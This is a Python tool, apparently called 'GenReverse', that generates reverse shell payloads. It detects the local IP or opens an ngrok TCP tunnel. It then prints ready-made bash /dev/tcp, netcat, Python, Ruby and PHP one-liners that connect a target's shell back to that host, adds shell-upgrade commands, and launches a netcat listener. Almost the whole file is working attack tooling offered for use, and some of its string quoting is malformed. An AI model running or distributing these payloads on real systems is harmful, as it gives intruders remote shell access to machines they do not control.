from scapy.all import Ether, IP
import pyfiglet
from termcolor import colored
import time
import os
from pyngrok import ngrok



# banner
ascii_banner = pyfiglet.figlet_format("GenReverse")
print(ascii_banner)

a = time.ctime()
# Afficher l'ip
ip1 = IP(dst="0.0.0.0").src
print(colored("####################################################", "blue"))
print(colored("\nYour IP :", "red"), "[",ip1,"]")


def reverseShell():
    print(colored("\n[BASH]", "blue"))
    print("bash -i >& /dev/tcp/" + str(ip1) + "/" + str(port), "0>&1")
    print(colored("\n[NETCAT]", "blue"))
    print("nc -e /bin/sh " + str(ip1) + " " + str(port))
    print(colored("\n[PYTHON]", "blue"))
    print(
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" +str(
            ip1) + "\"," + str(
            port) + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
    print(colored("\n[RUBY]", "blue"))
    print("ruby -rsocket -e'f=TCPSocket.open(\""+str(ip1)+"\","+str(port)+").to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'")
    print(colored("\n[PHP]", "blue"))
    print("php -r '$sock=fsockopen(\"" +str(ip1)+ "\"," +str(port)+ ");exec(""/bin/sh -i <&3 >&3 2>&3);'")
    print(colored("\n[POWERSHELL]", "blue"))
    
    print(colored("\n#############################################", "blue"))
    print(colored("\nTo upgrade the shell use:", "blue"))
    print(colored("\npython -c 'import pty;pty.spawn(""/bin/bash"")'", "red"))
    print(colored("\nOr", "blue"))
    print(colored("\n/usr/bin/script -qc /bin/bash /dev/null", "red"))
    print(colored("\nLaunching the listener...", "red"))
    time.sleep(2)
    os.system('\n\nsudo nc -lvnp' + str(port))




#Ngrok utilisation 
def usengrok():
    print("\nActivation of Ngrok..")
    time.sleep(2)
    connection = ngrok.connect(port, "tcp").public_url
    ssh, port1 = connection.strip("tcp://").split(":")
    print("\nUrl ngrok: ", ssh)
    print("Port ngrok: ", port1)
    print(colored("\n[BASH]", "blue"))
    print("bash -i >& /dev/tcp/" + str(ssh) + "/" + str(port1), "0>&1")
    print(colored("\n[NETCAT]", "blue"))
    print("nc -e /bin/sh " + str(ssh) + " " + str(port1))
    print(colored("\n[PYTHON]", "blue"))
    print(
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" +str(
            ssh) + "\"," + str(
            port1) + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"'")
    print(colored("\n[RUBY]", "blue"))
    print("ruby -rsocket -e'f=TCPSocket.open(\""+str(ssh)+"\","+str(port1)+").to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'")
    print(colored("\n[PHP]", "blue"))
    print("php -r '$sock=fsockopen(\"" +str(ssh)+ "\"," +str(port1)+ ");exec(""/bin/sh -i <&3 >&3 2>&3);'")
    print(colored("\n#############################################", "blue"))
    print(colored("\nTo upgrade the shell use:", "blue"))
    print(colored("\npython -c 'import pty;pty.spawn(""/bin/bash"")'", "red"))
    print(colored("\nOr", "blue"))
    print(colored("\n/usr/bin/script -qc /bin/bash /dev/null", "red"))
    print(colored("\nLaunching the listener:", "red"))
    time.sleep(2)
    os.system('\n\nnc -lvp' + str(port))



#port
port = input("\nEnter the listening port : ")


#Main
def ip():
    a = input("\n1- Using Ngrok ?:\n2- Use this IP " + ip1 + " ?:\n\nMake your choice ? : ")
    if a == "1":
        usengrok()
        return

    if a == "2":
        reverseShell()
        return
        
    if a == "3":
        ip2 = input("choisie ton ip:?")
        ip2 = ip1
        reverseShell()
        
        return

    if a > "2":
      print("Aurevoir") 

    else:
        print("Faite un choix!")


ip()
